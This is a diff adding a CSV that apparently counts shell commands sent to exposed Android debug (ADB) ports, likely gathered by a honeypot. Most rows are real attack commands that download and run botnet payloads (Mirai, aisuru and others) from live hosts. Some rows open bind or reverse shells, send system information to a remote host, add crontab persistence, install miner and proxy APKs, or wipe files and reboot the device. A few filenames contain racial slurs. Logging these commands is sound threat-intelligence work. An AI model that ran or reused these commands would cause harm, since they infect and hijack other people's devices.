@@ -1,0 +1,229 @@
+input,count
+,355
+(cd /data/local/tmp || cd /sdcard/downloads) && (wget -qO droid.sh http://213.209.150.186/droid.sh || curl -o droid.sh -sL http://213.209.150.186/droid.sh) && chmod 777 droid.sh && chmod +x droid.sh && ./droid.sh,2
+(cd /data/local/tmp || cd /sdcard/downloads) && (wget -qO- http://213.209.150.186/droid.sh || curl -sL http://213.209.150.186/droid.sh) > droid.sh && chmod 777 droid.sh && chmod +x droid.sh && /system/bin/sh ./droid.sh &,6
+(cd /data/local/tmp || cd /sdcard/downloads) && (wget -qO- http://213.209.150.186/droid.sh || curl -sL http://213.209.150.186/droid.sh) | sh,2
+(ping -c 1 46.8.78.9)& ,2
+/data/local/tmp/arm3 criminalip2,1
+/data/local/tmp/arm3 shodan1,2
+/data/local/tmp/arm3/main criminalip2,1
+/data/local/tmp/arm6 20241231-GLOBAL2,1
+/data/local/tmp/arm6 20250101-CIDR,1
+/data/local/tmp/arm6 20250102-MAIN,1
+/data/local/tmp/arm6/arm32 20241231-GLOBAL2,1
+/data/local/tmp/arm6/arm32 20250101-CIDR,1
+/data/local/tmp/arm6/arm32 20250102-MAIN,1
+/data/local/tmp/nohup /data/local/tmp/log,102
+/data/local/tmp/nohup /data/local/tmp/trinity,625
+/data/local/tmp/nohup su -c /data/local/tmp/log,102
+/data/local/tmp/nohup su -c /data/local/tmp/trinity,625
+>/data/local/tmp/Downloads && cd /data/local/tmp/Downloads; >/sdcard/0/Downloads && cd /sdcard/0/Downloads; >/storage/emulated/0/Downloads && cd /storage/emulated/0/Downloads; wget http://103.149.87.69/d/hello -O-|sh,2
+am start -n com.androld.servlces/.MainActivity,51
+am start -n com.google.home.tv/com.example.test.MainActivity,113
+am start -n com.socks.agent/.MainActivity,1246
+am start -n com.ufo.miner/com.example.test.MainActivity,743
+am start-foreground-service -n com.pluto.nouiapp/com.pluto.nouiapp.ForegroundService,2
+am start-foreground-service -n com.wildlands.priv.lob/com.wildlands.priv.lob.ForegroundService,1
+busybox nc -l -p 5555 -e /bin/sh,6
+cd /data/local/tmp/ || cd /sdcard;wget http://77.37.96.100/z/arm7; chmod 755 arm7 ; ./arm7 adb,1
+cd /data/local/tmp/; busybox wget http://1.3.3.7/w.sh; sh w.sh; curl http://1.3.3.7/c.sh; sh c.sh,2
+cd /data/local/tmp/; busybox wget http://103.142.27.125/w.sh; sh w.sh; curl http://103.142.27.125/c.sh; sh c.sh,23
+cd /data/local/tmp/; busybox wget http://103.175.16.117/adb.sh -O- | sh,144
+cd /data/local/tmp/; busybox wget http://107.172.51.228/w.sh; sh w.sh; curl http://107.172.51.228/c.sh; sh c.sh,8
+cd /data/local/tmp/; busybox wget http://107.173.35.192/w.sh; sh w.sh; curl http://107.173.35.192/c.sh; sh c.sh,2
+cd /data/local/tmp/; busybox wget http://107.189.31.150/justbash.sh; sh justbash.sh; rm -rf justbash.sh,1
+cd /data/local/tmp/; busybox wget http://134.209.74.81/w.sh; sh w.sh; curl http://134.209.74.81/c.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,7
+cd /data/local/tmp/; busybox wget http://141.98.10.115/w.sh; sh w.sh; curl http://1.3.3.7/c.sh; sh c.sh,2
+cd /data/local/tmp/; busybox wget http://141.98.10.115/w.sh; sh w.sh; curl http://141.98.10.115/c.sh; sh c.sh,8
+cd /data/local/tmp/; busybox wget http://143.198.168.25/w.sh; sh w.sh; curl http://143.198.168.25/c.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,2
+cd /data/local/tmp/; busybox wget http://147.185.221.24:9456/nigger1.sh; sh w.sh; curl http://147.185.221.24:9456/nigger2.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,1
+cd /data/local/tmp/; busybox wget http://147.185.221.25:22983/wtds.sh; sh wtds.sh,6
+cd /data/local/tmp/; busybox wget http://147.185.221.25:27143/dwadjs.sh; sh dwadjs.sh; rm -rf dwadjs.sh; rm -rf *,3
+cd /data/local/tmp/; busybox wget http://154.213.187.80/w.sh; sh w.sh; curl http://154.213.187.80/c.sh; sh c.sh,9
+cd /data/local/tmp/; busybox wget http://154.213.190.241/w.sh; sh w.sh; curl http://154.213.190.241/c.sh; sh c.sh,42
+cd /data/local/tmp/; busybox wget http://154.216.19.12/w.sh; sh w.sh; curl http://154.216.19.12/c.sh; sh c.sh,4
+cd /data/local/tmp/; busybox wget http://160.187.146.122/w.sh; sh w.sh; curl http://160.187.146.122/c.sh; sh c.sh,76
+cd /data/local/tmp/; busybox wget http://160.191.86.209/ohshit.sh| curl http://160.191.86.209/ohshit.sh | wget http://160.191.86.209/ohshit.sh; chmod 777 *; ./ohshit.sh,1
+cd /data/local/tmp/; busybox wget http://160.22.160.117/w.sh; sh w.sh; curl http://160.22.160.117/c.sh; sh c.sh,12
+cd /data/local/tmp/; busybox wget http://160.22.160.31/w.sh; sh w.sh; curl http://160.22.160.31/c.sh; sh c.sh,10
+cd /data/local/tmp/; busybox wget http://160.22.161.157/w.sh; sh w.sh; curl http://160.22.161.157/c.sh; sh c.sh,4
+cd /data/local/tmp/; busybox wget http://160.22.161.89/w.sh; sh w.sh; curl http://160.22.161.89/c.sh; sh c.sh,16
+cd /data/local/tmp/; busybox wget http://170.64.166.179/fuckoffnigger22241.sh; sh fuckoffnigger22241.sh; rm -rf fuckoffnigger22241.sh; rm -rf *,4
+cd /data/local/tmp/; busybox wget http://185.196.9.234/w.sh; sh w.sh; curl http://185.196.9.234/c.sh; sh c.sh,5
+cd /data/local/tmp/; busybox wget http://185.232.205.17/w.sh; sh w.sh; curl http://185.232.205.17/c.sh; sh c.sh,25
+cd /data/local/tmp/; busybox wget http://185.255.120.43/w.sh; sh w.sh; curl http://185.255.120.43/c.sh; sh c.sh,37
+cd /data/local/tmp/; busybox wget http://185.39.207.117/adb.sh -O- | sh,3
+cd /data/local/tmp/; busybox wget http://192.3.1.113/w.sh; sh w.sh; curl http://192.3.1.113/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://193.32.162.27/bins/w.sh; sh w.sh; curl http://193.32.162.27/bins/c.sh; sh c.sh,298
+cd /data/local/tmp/; busybox wget http://193.32.162.27/w.sh; sh w.sh; curl http://193.32.162.27/c.sh; sh c.sh,576
+cd /data/local/tmp/; busybox wget http://193.32.162.38/w.sh; sh w.sh; curl http://193.32.162.38/c.sh; sh c.sh,2
+cd /data/local/tmp/; busybox wget http://20.221.64.23/w.sh; sh w.sh; curl http://20.221.64.23/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://205.185.113.47/w.sh; sh w.sh; curl http://205.185.113.47/c.sh; sh c.sh; wget http://205.185.113.47/wget.sh; sh wget.sh,3
+cd /data/local/tmp/; busybox wget http://209.38.31.174/wmlsw.sh; sh wmlsw.sh; rm -rf wmlsw.sh; rm -rf *,2
+cd /data/local/tmp/; busybox wget http://213.209.129.101/adbyoupoopyheadshitface.sh; sh adbyoupoopyheadshitface.sh; rm -rf adbyoupoopyheadshitface.sh,2
+cd /data/local/tmp/; busybox wget http://213.209.129.55/poop.sh; sh poop.sh; rm -rf poop.sh,29
+cd /data/local/tmp/; busybox wget http://213.209.129.92/booty.sh; sh booty.sh; rm -rf booty.sh,6
+cd /data/local/tmp/; busybox wget http://213.209.129.92/somekidsmom.sh; sh somekidsmom.sh; rm -rf somekidsmom.sh,3
+cd /data/local/tmp/; busybox wget http://23.146.184.166/w.sh; sh w.sh; curl http://23.146.184.166/c.sh; sh c.sh,14
+cd /data/local/tmp/; busybox wget http://23.146.184.61/w.sh; sh w.sh; curl http://23.146.184.61/c.sh; sh c.sh,17
+cd /data/local/tmp/; busybox wget http://42.112.26.36/adb.sh -O- | sh,114
+cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,333
+cd /data/local/tmp/; busybox wget http://45.11.229.38/fuckoffnigger22241.sh; sh fuckoffnigger22241.sh; rm -rf fuckoffnigger22241.sh; rm -rf *,1
+cd /data/local/tmp/; busybox wget http://45.12.130.27/w.sh; sh w.sh; curl http://45.12.130.27/c.sh; sh c.sh,3
+cd /data/local/tmp/; busybox wget http://45.125.66.103/w.sh; sh w.sh; curl http://45.125.66.103/c.sh; sh c.sh,2
+cd /data/local/tmp/; busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm adb; busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 adb,93
+cd /data/local/tmp/; busybox wget http://45.125.66.56/oarm; chmod 777 oarm; ./oarm adb; busybox wget http://45.125.66.56/oarm7; chmod 777 oarm7; ./oarm7 adb,1
+cd /data/local/tmp/; busybox wget http://45.131.111.198/nigger1.sh; sh w.sh; curl http://45.131.111.198/nigger2.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,2
+cd /data/local/tmp/; busybox wget http://45.200.148.113/w.sh; sh w.sh; curl http://45.200.148.113/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://45.202.35.56/w.sh; sh w.sh; curl http://45.202.35.56/c.sh; sh c.sh; rm -rf w.sh; rm -rf c.sh,4
+cd /data/local/tmp/; busybox wget http://45.202.35.56/w.sh; sh w.sh; curl http://45.202.35.56/c.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,5
+cd /data/local/tmp/; busybox wget http://45.202.35.68/w.sh; sh w.sh; curl http://45.202.35.68/c.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,14
+cd /data/local/tmp/; busybox wget http://45.39.70.13/w.sh; sh w.sh; curl http://45.39.70.13/c.sh; sh c.sh,5
+cd /data/local/tmp/; busybox wget http://45.66.231.148/r; sh r adb; curl http://45.66.231.148/r; sh r adb,3
+cd /data/local/tmp/; busybox wget http://45.88.88.43/w.sh; sh w.sh; curl http://45.88.88.43/c.sh; sh c.sh,43
+cd /data/local/tmp/; busybox wget http://46.19.143.30/w.sh; sh w.sh; curl http://46.19.143.30/c.sh; sh c.sh,2
+cd /data/local/tmp/; busybox wget http://46.203.233.30/android/c.sh; sh c.sh; curl http://46.203.233.30/android/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://46.203.233.30/android/w.sh; sh w.sh; curl http://46.203.233.30/android/c.sh; sh c.sh,6
+cd /data/local/tmp/; busybox wget http://5.175.237.74/w.sh; sh w.sh; curl http://5.175.237.74/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://51.120.244.179/w.sh; sh w.sh; curl http://51.120.244.179/c.sh; sh c.sh,14
+cd /data/local/tmp/; busybox wget http://77.221.153.161/w.sh; sh w.sh; curl http://77.221.153.161/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://77.221.157.206/zhoung/w.sh; sh w.sh; curl http://77.221.157.206/zhoung/c.sh; sh c.sh,2
+cd /data/local/tmp/; busybox wget http://81.161.238.213/w.sh; sh w.sh; curl http://81.161.238.213/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://87.121.84.219/w.sh; sh w.sh; curl http://87.121.84.219/c.sh; sh c.sh,6
+cd /data/local/tmp/; busybox wget http://87.121.84.37/w.sh; sh w.sh; curl http://87.121.84.37/c.sh; sh c.sh,41
+cd /data/local/tmp/; busybox wget http://87.121.84.39w.sh; sh w.sh; curl http://87.121.84.39/c.sh; sh c.sh,3
+cd /data/local/tmp/; busybox wget http://89.169.4.44/w.sh; sh w.sh; curl http://89.169.4.44/c.sh; sh c.sh,13
+cd /data/local/tmp/; busybox wget http://93.123.109.208/w.sh; sh w.sh; curl http://93.123.109.208/c.sh; sh c.sh,12
+cd /data/local/tmp/; busybox wget http://94.142.130.241/w.sh; sh w.sh; curl http://94.142.130.241/c.sh; sh c.sh,203
+cd /data/local/tmp/; busybox wget http://94.156.177.119/w.sh; sh w.sh android.exploit; curl http://94.156.177.119/c.sh; sh c.sh android.exploit,1
+cd /data/local/tmp/; busybox wget http://94.156.189.224/w.sh; sh w.sh; curl http://94.156.189.224/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://server.eye-network.ru/w.sh; sh w.sh; curl http://server.eye-network.ru/c.sh; sh c.sh,2
+cd /data/local/tmp/; busybox wget http://server1.eye-network.ru/w.sh; sh w.sh; curl http://server1.eye-network.ru/c.sh; sh c.sh,1
+cd /data/local/tmp/; busybox wget http://server2.eye-network.ru/w.sh; sh w.sh; curl http://server2.eye-network.ru/c.sh; sh c.sh,1
+cd /data/local/tmp/; curl http://103.77.172.24/curl.sh; sh curl.sh; busybox wget http://103.77.172.24/busybox.sh; sh busybox.sh; wget http://103.77.172.24/wget.sh; sh wget.sh; rm -rf *,7
+cd /data/local/tmp/; curl http://137.184.54.184/curl.sh; sh curl.sh; busybox wget http://137.184.54.184/busybox.sh; sh busybox.sh; wget http://137.184.54.184/wget.sh; sh wget.sh; rm -rf *,1
+cd /data/local/tmp/; curl http://15.235.143.186/bbccbbc.sh; sh bbccbbc.sh; busybox wget http://15.235.143.186/bbccbbbw.sh; sh bbccbbbw.sh; wget http://15.235.143.186/bbccbbw.sh; sh bbccbbw.sh; rm -rf *,9
+cd /data/local/tmp/; curl http://15.235.203.214/bolosicancu.sh; sh bolosicancu.sh; busybox wget http://15.235.203.214/bolosicanbu.sh; sh bolosicanbu.sh; wget http://15.235.203.214/bolosicanwe.sh; sh bolosicanwe.sh; rm -rf *,6
+cd /data/local/tmp/; curl http://36.50.135.139/huyhoangc.sh; sh huyhoangc.sh; busybox wget http://36.50.135.139/huyhoangbw.sh; sh huyhoangbw.sh; wget http://36.50.135.139/huyhoangw.sh; sh huyhoangw.sh; rm -rf *,2
+cd /data/local/tmp/; pkill -f sh; pkill -f arm; pkill -f arm5; pkill -f arm6; pkill -f arm7; pkill -f mips; pkill -f ppc; pkill -f spc; pkill -f x86; pkill -f x86_64;,8
+cd /data/local/tmp/; rm * -rf; killall /bin/busybox ; rm * ; wget http://185.93.89.101/arm7; curl http://185.93.89.101/arm7 -O- ; chmod 777 arm7; ./arm7 adblocker; rm * -rf,2
+cd /data/local/tmp/; rm * -rf; killall /bin/busybox ; rm * ; wget http://185.93.89.106/arm7; curl http://185.93.89.106/arm7 -O- ; chmod 777 arm7; ./arm7 adblocker; rm * -rf,2
+cd /data/local/tmp/; rm *; busybox wget http://146.19.24.68/arm7; chmod 777 arm7; ./arm7 ADB,17
+cd /data/local/tmp/; rm *; busybox wget http://150.241.103.211/arm7; chmod 777 arm7; ./arm7 BRUHH,1
+cd /data/local/tmp/; rm *; busybox wget http://178.215.238.13/arm7; chmod 777 arm7; ./arm7 BRUHH,1
+cd /data/local/tmp/; rm *; busybox wget http://178.215.238.8/arm7; chmod 777 arm7; ./arm7 BRUHH,1
+cd /data/local/tmp/; rm *; busybox wget http://185.132.53.13/mirai.arm7; chmod 777 mirai.arm7; ./mirai.arm7 BRUHH,1
+cd /data/local/tmp/; rm *; busybox wget http://185.142.53.43/arm7; chmod 777 arm7; ./arm7 ADB,2
+cd /data/local/tmp/; rm *; busybox wget http://185.93.89.101/larm7; curl http://185.93.89.101/larm7 -O- ; chmod 777 larm7; ./larm7 adblocker;rm * -rf,1
+cd /data/local/tmp/; rm *; busybox wget http://192.142.102.239/arm7; chmod 777 arm7; ./arm7 BRUHH,1
+cd /data/local/tmp/; rm *; busybox wget http://194.165.16.26/arm7; chmod 777 arm7; ./arm7 BRUHH,4
+cd /data/local/tmp/; rm *; busybox wget http://212.64.215.71/arm7; chmod 777 arm7; ./arm7 ADB,2
+cd /data/local/tmp/; rm *; busybox wget http://45.202.35.24/binns/arm7; chmod 777 arm7; ./arm7 BRUHH,1
+cd /data/local/tmp/; rm *; busybox wget http://45.202.35.24/oth/arm7; chmod 777 arm7; ./arm7 BRUHH,3
+cd /data/local/tmp/; rm *; busybox wget http://45.202.35.36/arm7; chmod 777 arm7; ./arm7 BRUHH,1
+cd /data/local/tmp/; rm *; busybox wget http://45.202.35.88/arm7; chmod 777 arm7; ./arm7 BRUHH,2
+cd /data/local/tmp/; rm *; busybox wget http://83.222.191.91/Kloki.arm7; chmod 777 Kloki.arm7; ./Kloki.arm7 adblocker,1
+cd /data/local/tmp/; rm *; busybox wget http://83.222.191.91/Kloki.arm7; curl http://83.222.191.91/Kloki.arm7 -O-; chmod 777 Kloki.arm7; ./Kloki.arm7 adblocker; wget http://83.222.191.91/a; chmod 777 a; ./a adblocker; rm * -rf,4
+cd /data/local/tmp/; rm *; busybox wget http://83.222.191.91/Kloki.arm7; curl http://83.222.191.91/Kloki.arm7 -O-; chmod 777 Kloki.arm7; ./Kloki.arm7 adblocker; wget http://83.222.191.91/a; chmod 777 a; ./a adblocker; rm* -rf,7
+cd /data/local/tmp/; rm *; busybox wget http://87.120.116.226/arm7; chmod 777 arm7; ./arm7 BRUHH,16
+cd /data/local/tmp/; rm *; busybox wget http://92.249.48.87/arm7; chmod 777 arm7; ./arm7 BRUHH,2
+cd /data/local/tmp/; rm *; busybox wget http://93.123.85.180/arm7; chmod 777 arm7; ./arm7 BRUHH,1
+cd /data/local/tmp/; rm *; busybox wget http://95.214.27.183/arm7; chmod 777 arm7; ./arm7 BRUHH,2
+cd /data/local/tmp/; rm -rf *; busybox wget http://176.65.140.135/w.sh; sh w.sh; curl http://176.65.140.135/c.sh; sh c.sh,4
+cd /data/local/tmp/; rm -rf *; busybox wget http://hailcocks.ru/adb; chmod 777 adb; ./adb android,1
+cd /data/local/tmp/; rm -rf *; busybox wget http://www.bluebytenetwork222.win/a-w.sh; sh a-w.sh; curl http://www.bluebytenetwork222.win/a-curl.sh; sh a-curl.sh; wget http://www.bluebytenetwork222.win/a-wget.sh; sh a-wget.sh; rm -rf *; rm -rf *,1
+cd /data/local/tmp/; rm -rf *; rm -rf w.sh; rm w.sh; rm -rf c.sh; rm c.sh; busybox wget http://154.216.20.174/w.sh; sh w.sh; curl http://154.216.20.174/c.sh; sh c.sh; rm -rf *,1
+cd /data/local/tmp/; rm -rf *; rm -rf w.sh; rm w.sh; rm -rf c.sh; rm c.sh; busybox wget http://45.200.149.77/w.sh; sh w.sh; curl http://45.200.149.77/c.sh; sh c.sh; rm -rf *,51
+cd /data/local/tmp/; rm aisuru.aarch64; busybox wget http://80.94.92.172/aisuru.aarch64; chmod 777 aisuru.aarch64; ./aisuru.aarch64 android,3
+cd /data/local/tmp/; rm aisuru.arm7; busybox wget http://80.94.92.172/aisuru.arm7; chmod 777 aisuru.arm7; ./aisuru.arm7 android,3
+cd /data/local/tmp/; wget http://143.244.175.131/w.sh; sh w.sh; curl http://143.244.175.131/c.sh; sh c.sh,3
+cd /data/local/tmp/; wget http://160.22.160.59/bins/scan.sh; sh scan.sh,1
+cd /data/local/tmp/; wget http://91.92.247.16/w.sh;chmod 777 w.sh; sh w.sh; curl http:/91.92.247.16/c.sh;chmod 777 c.sh; sh c.sh,3
+cd /data/local/tmp/; wget http://94.156.69.235/w.sh;chmod 777 w.sh; sh w.sh; curl http:/94.156.69.235/c.sh;chmod 777 c.sh; sh c.sh,4
+cd /data/local/tmp/; wget http://http://sfgjzgjhsfg.ddns.net/bins/a.sh; sh a.sh; curl http://sfgjzgjhsfg.ddns.net/bins/a.sh; sh a.sh,1
+cd /data/local/tmp/; wget http://sfgjzgjhsfg.ddns.net/bins/a.sh;chmod 777 *; sh a.sh; curl http://sfgjzgjhsfg.ddns.net/bins/a.sh;chmod 777 *; sh a.sh,1
+cd /data/local/tmp/;reboot;,62
+cd /data/local/tmp/;rm -rf *;reboot;chmod 777 /sbin/reboot; /sbin/reboot; chmod 777 /bin/reboot; /bin/reboot; /bin/busybox reboot; reboot,3
+cd /data/local/tmp/;rm -rf w.sh c.sh; busybox wget http://93.123.85.8/w.sh; sh w.sh; curl http://93.123.85.8/c.sh; sh c.sh,3
+cd /data/local/tmp; curl -O http://95.214.27.26:8080/files/xdp.arm7; chmod 777 xdp.arm7; ./xdp.arm7 android,1
+cd /data/local/tmp; wget http://156.238.224.214/ada.sh; chmod 777 ada.sh;./ada.sh; rm -rf ada.sh,2
+cd /data/local/tmp;echo 0 > tmpf,4
+cd /sdcard;wget http://141.98.11.136/z/arm7; chmod 755 arm7 ; ./arm7 adb,3
+cd /tmp; curl http://141.98.11.136/z/arm7 -O ;wget http://141.98.11.136/z/arm7; chmod 777 arm7 ; ./arm7 adb,3
+cd /tmp; curl http://83.168.110.206/z/arm7 -O ;wget http://77.37.96.100/z/arm7; chmod 777 arm7 ; ./arm7 adb,1
+cd /tmp;wget -O- http://85.192.56.29/adb-w;busybox wget -O- http://85.192.56.29/adb-b;curl http://85.192.56.29/adb-c;,2
+cd /var/tmp/; wget http://jhbaghjbasdg.shop/askljdghreg/a.sh;chmod 777 *; sh a.sh; curl http://jhbaghjbasdg.shop/askljdghreg/a.sh;chmod 777 *; sh a.sh,1
+cd /var/tmp/; wget http://jhbaghjbasdg.shop/nmbxcvasg/a.sh;chmod 777 *; sh a.sh; curl http://jhbaghjbasdg.shop/nmbxcvasg/a.sh;chmod 777 *; sh a.sh,4
+cd /var/tmp/;busybox nc 185.196.9.43 9001 -e sh,2
+chmod 0755 /data/local/tmp/log,102
+chmod 0755 /data/local/tmp/nohup,728
+chmod 0755 /data/local/tmp/trinity,625
+chmod 777 /data/local/tmp,2
+chmod 777 /data/local/tmp/arm3,2
+chmod 777 /data/local/tmp/arm3/main,1
+chmod 777 /data/local/tmp/arm6,3
+chmod 777 /data/local/tmp/arm6/arm32,3
+"echo ""ping""",5
+"echo ""tbk / $(uname -a) / $(uname -r)"" | nc 45.135.193.4 1234;",1
+echo $(export cmd=$(getprop ro.product.cpu.abi 2>/dev/null || echo unknown) && echo $cmd):$(which su 2>/dev/null || echo unavailable,1
+echo '@reboot /tmp/hajime.txt' >> /etc/crontab,6
+echo hello,4
+exec pkill -f arm,469
+exec sh -c 'for pid in /proc/*; do grep -q arm $pid/cmdline 2>/dev/null && kill $(basename $pid); done',116
+for pid in $(ls /proc | grep '^[0-9]'); do exe=$(readlink /proc/$pid/exe 2>/dev/null); [[ $exe =~ \(deleted\)|/\.|dvrHelper|.*\..*\..* ]] && kill -9 $pid; done; reboot -f; reboot; init 6; shutdown -r now,1
+getprop,1
+"kill -9 $(ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(sh)/ && $2 > 15 && $1 != '$$' {print $1}'); kill -9 $(pgrep -f Cyber); kill -9 $(pgrep -f 3kuhgguhz4uhz); pkill -f /var/Cyber; pkill -f 3kuhgguhz4uhz",4
+monkey -p com.example.backgroundservice -c android.intent.category.LAUNCHER 1 --pct-persist 100,2
+monkey -p com.one.dive -v 500,2
+monkey -p com.socks.agent -c android.intent.category.LAUNCHER 1,1
+pidof com.one.dive,1
+ping -c 1 45.221.98.118; ,3
+ping -c 1 46.8.78.9; ,2
+pkill -f $(pgrep -f locker.sh); kill -9 $(pgrep -f locker.sh); pkill -f sh; kill -9 sh,2
+pkill arm3,2
+pkill main,1
+pm 'install' '/data/local/tmp/V1-Priv.Lob.apk',1
+pm 'install' '/data/local/tmp/androidserv.apk',51
+pm 'install' '/data/local/tmp/app-release.apk',788
+pm 'install' '/data/local/tmp/app.apk',459
+pm 'install' '/data/local/tmp/app2.apk',1
+pm 'install' '/data/local/tmp/gg-app-debug.apk',2
+pm 'install' '/data/local/tmp/tv1.apk',2
+pm 'install' '/data/local/tmp/ufo.apk',1
+pm 'uninstall' 'com.androld.servlces',4
+pm 'uninstall' 'com.one.dive',5
+pm 'uninstall' 'com.socks.agent',705
+pm install /data/local/tmp/app-release.apk,1
+pm install /data/local/tmp/tv.apk,111
+pm install /data/local/tmp/ufo.apk,603
+pm list packages,34
+pm path com.google.home.tv,123
+pm path com.ufo.miner,806
+pm uninstall com.one.dive,1
+ps -aux,2
+ps | grep log,113
+ps | grep rig,113
+ps | grep trinity,742
+ps | grep xig,141
+rm '/data/local/tmp/app.apk' </dev/null,1
+rm '/data/local/tmp/app2.apk' </dev/null,1
+rm -f '/data/local/tmp/V1-Priv.Lob.apk',1
+rm -f '/data/local/tmp/androidserv.apk',51
+rm -f '/data/local/tmp/app-release.apk',788
+rm -f '/data/local/tmp/app.apk',460
+rm -f '/data/local/tmp/gg-app-debug.apk',2
+rm -f '/data/local/tmp/tv1.apk',2
+rm -f '/data/local/tmp/ufo.apk',1
+rm -f /data/local/tmp/*.apk,853
+rm -f /data/local/tmp/tv.apk,41
+rm -f /data/local/tmp/ufo.apk,402
+rm -f /tmp/*.apk,875
+rm -rf /data/local/tmp/*,1111
+rm /data/local/tmp/*.apk,490
+rm /data/local/tmp/tv.apk,72
+rm /data/local/tmp/ufo.apk,217
+screencap /data/local/tmp/screenshot.png,1
+"su -c ""cd /data/local || cd /tmp || cd /sdcard ; curl http://141.98.11.136/z/arm7 -O ;wget http://141.98.11.136/z/arm7; chmod 755 arm7 ; ./arm7 adb""",7
+"su -c ""cd /data/local/; curl http://77.37.96.100/z/arm7 -O ;wget http://77.37.96.100/z/arm7; chmod 755 arm7 ; ./arm7 adb""",1
+top -b -n 1,9
+whoami,2
